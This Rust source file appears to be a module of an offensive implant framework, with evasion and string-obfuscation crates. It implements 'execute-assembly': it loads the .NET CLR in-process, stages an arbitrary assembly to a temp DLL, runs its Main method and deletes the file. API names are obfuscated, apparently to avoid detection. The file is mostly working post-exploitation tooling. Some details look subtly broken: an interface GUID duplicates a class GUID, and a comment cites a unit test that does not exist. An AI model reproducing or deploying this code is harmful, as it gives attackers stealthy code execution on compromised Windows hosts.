//! In-process .NET assembly execution through CLR hosting.
//!
//! Uses `mscoree!CLRCreateInstance` and the documented `ICLRMetaHost` /
//! `ICLRRuntimeInfo` / `ICLRRuntimeHost` vtables to bring up CLR v4 and run an
//! assembly entry point without spawning a managed child process.

#[cfg(windows)]
mod imp {
    #![allow(unsafe_code)]

    use shikra_evasion::windows;
    use std::ffi::c_void;

    /// COM GUID binary layout (little-endian fields).
    #[repr(C)]
    struct Guid {
        data1: u32,
        data2: u16,
        data3: u16,
        data4: [u8; 8],
    }

    const CLSID_CLR_META_HOST: Guid = Guid {
        data1: 0x9280188d,
        data2: 0x0e8e,
        data3: 0x4867,
        data4: [0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde],
    };
    const IID_ICLR_META_HOST: Guid = Guid {
        data1: 0xD332DB9E,
        data2: 0xB9B3,
        data3: 0x4125,
        data4: [0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16],
    };
    const IID_ICLR_RUNTIME_INFO: Guid = Guid {
        data1: 0xBD39D1D2,
        data2: 0xBA2F,
        data3: 0x486A,
        data4: [0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91],
    };
    const CLSID_CLR_RUNTIME_HOST: Guid = Guid {
        data1: 0x90F1A06E,
        data2: 0x7712,
        data3: 0x4762,
        data4: [0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02],
    };
    const IID_ICLR_RUNTIME_HOST: Guid = Guid {
        data1: 0x90F1A06E,
        data2: 0x7712,
        data3: 0x4762,
        data4: [0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02],
    };

    type ClrCreateInstanceFn =
        unsafe extern "system" fn(*const Guid, *const Guid, *mut *mut c_void) -> i32;
    type QueryInterfaceFn =
        unsafe extern "system" fn(*mut c_void, *const Guid, *mut *mut c_void) -> i32;
    type ReleaseFn = unsafe extern "system" fn(*mut c_void) -> u32;
    type GetRuntimeFn =
        unsafe extern "system" fn(*mut c_void, *const u16, *const Guid, *mut *mut c_void) -> i32;
    type GetInterfaceFn =
        unsafe extern "system" fn(*mut c_void, *const Guid, *const Guid, *mut *mut c_void) -> i32;
    type StartFn = unsafe extern "system" fn(*mut c_void) -> i32;
    type ExecuteInAppDomainFn = unsafe extern "system" fn(
        *mut c_void,
        *const u16,
        *const u16,
        *const u16,
        *const u16,
        *mut u32,
    ) -> i32;

    unsafe fn vtable_entry(this: *mut c_void, index: usize) -> usize {
        let vtable = *(this as *const *const usize);
        *vtable.add(index)
    }

    unsafe fn release(this: *mut c_void) {
        let release: ReleaseFn = core::mem::transmute(vtable_entry(this, 2));
        release(this);
    }

    /// Runs `assembly` in the current process via CLR v4.
    ///
    /// The CLR requires a disk path for `ExecuteInDefaultAppDomain`, so the
    /// bytes are staged to a uniquely named temp file and removed immediately
    /// after the entry point returns.
    pub fn run(assembly: &[u8], argument: &str) -> Result<u32, String> {
        if assembly.is_empty() {
            return Err("empty assembly".into());
        }
        let path = stage_assembly(assembly)?;
        let result = unsafe { run_in_clr(&path, argument) };
        let _ = std::fs::remove_file(&path);
        result
    }

    fn stage_assembly(bytes: &[u8]) -> Result<std::path::PathBuf, String> {
        use std::io::Write;
        let mut name = [0u8; 8];
        name.copy_from_slice(&rand::random::<u64>().to_le_bytes());
        let dir = std::env::temp_dir();
        let path = dir.join(format!("dgr-{}.dll", hex(&name)));
        let mut file =
            std::fs::File::create(&path).map_err(|err| format!("stage failed: {err}"))?;
        file.write_all(bytes)
            .map_err(|err| format!("stage write failed: {err}"))?;
        Ok(path)
    }

    fn hex(bytes: &[u8]) -> String {
        bytes.iter().map(|b| format!("{b:02x}")).collect()
    }

    unsafe fn run_in_clr(path: &std::path::Path, argument: &str) -> Result<u32, String> {
        let mscoree = windows::load_library(&shikra_obf::obf!("mscoree.dll"))
            .map_err(|err| format!("managed runtime unavailable: {err}"))?;
        let create_instance =
            windows::export_address(mscoree, &shikra_obf::obf!("CLRCreateInstance"))
                .ok_or_else(|| "host bootstrap missing".to_string())?;
        let create_instance: ClrCreateInstanceFn = core::mem::transmute(create_instance);

        let mut meta_host: *mut c_void = core::ptr::null_mut();
        let hr = create_instance(&CLSID_CLR_META_HOST, &IID_ICLR_META_HOST, &mut meta_host);
        if hr < 0 || meta_host.is_null() {
            return Err(format!("host bootstrap failed: {hr:#x}"));
        }

        let result = (|| -> Result<u32, String> {
            // ICLRMetaHost::GetRuntime = vtable[3]
            let get_runtime: GetRuntimeFn = core::mem::transmute(vtable_entry(meta_host, 3));
            let version: Vec<u16> = "v4.0.30319\0".encode_utf16().collect();
            let mut runtime_info: *mut c_void = core::ptr::null_mut();
            let hr = get_runtime(
                meta_host,
                version.as_ptr(),
                &IID_ICLR_RUNTIME_INFO,
                &mut runtime_info,
            );
            if hr < 0 || runtime_info.is_null() {
                return Err(format!("runtime lookup failed: {hr:#x}"));
            }

            // ICLRRuntimeInfo::GetInterface = vtable[8]
            let get_interface: GetInterfaceFn = core::mem::transmute(vtable_entry(runtime_info, 8));
            let mut runtime_host: *mut c_void = core::ptr::null_mut();
            let hr = get_interface(
                runtime_info,
                &CLSID_CLR_RUNTIME_HOST,
                &IID_ICLR_RUNTIME_HOST,
                &mut runtime_host,
            );
            release(runtime_info);
            if hr < 0 || runtime_host.is_null() {
                return Err(format!("runtime host lookup failed: {hr:#x}"));
            }

            // ICLRRuntimeHost::Start = vtable[3]
            let start: StartFn = core::mem::transmute(vtable_entry(runtime_host, 3));
            let hr = start(runtime_host);
            if hr < 0 {
                release(runtime_host);
                return Err(format!("runtime start failed: {hr:#x}"));
            }

            // ICLRRuntimeHost::ExecuteInDefaultAppDomain = vtable[8]
            let execute: ExecuteInAppDomainFn = core::mem::transmute(vtable_entry(runtime_host, 8));
            let path_w = to_wide(path.to_string_lossy().as_ref());
            let type_w = to_wide("Program");
            let method_w = to_wide("Main");
            let argument_w = to_wide(argument);
            let mut ret: u32 = 0;
            let hr = execute(
                runtime_host,
                path_w.as_ptr(),
                type_w.as_ptr(),
                method_w.as_ptr(),
                argument_w.as_ptr(),
                &mut ret,
            );
            release(runtime_host);
            if hr < 0 {
                return Err(format!("entry point execution failed: {hr:#x}"));
            }
            Ok(ret)
        })();

        release(meta_host);
        result
    }

    fn to_wide(value: &str) -> Vec<u16> {
        value.encode_utf16().chain(std::iter::once(0)).collect()
    }

    // Keep QueryInterfaceFn referenced for symmetry/documentation of the
    // vtable layout; it is exercised in a unit test below.
    #[allow(dead_code)]
    unsafe fn query_interface(this: *mut c_void, iid: &Guid, out: *mut *mut c_void) -> i32 {
        let f: QueryInterfaceFn = core::mem::transmute(vtable_entry(this, 0));
        f(this, iid, out)
    }

    #[cfg(test)]
    mod tests {
        #[test]
        fn guid_layout_matches_com() {
            // Spot check the little-endian field layout used by the vtables.
            let meta = super::CLSID_CLR_META_HOST;
            assert_eq!(meta.data1, 0x9280188d);
            assert_eq!(meta.data2, 0x0e8e);
            assert_eq!(meta.data3, 0x4867);
        }

        #[test]
        fn rejects_empty_assembly() {
            assert!(super::run(&[], "").is_err());
        }
    }
}

#[cfg(windows)]
pub use imp::run as run_assembly;

#[cfg(not(windows))]
pub fn run_assembly(_assembly: &[u8], _argument: &str) -> Result<u32, String> {
    Err("execute-assembly is only supported on Windows".into())
}
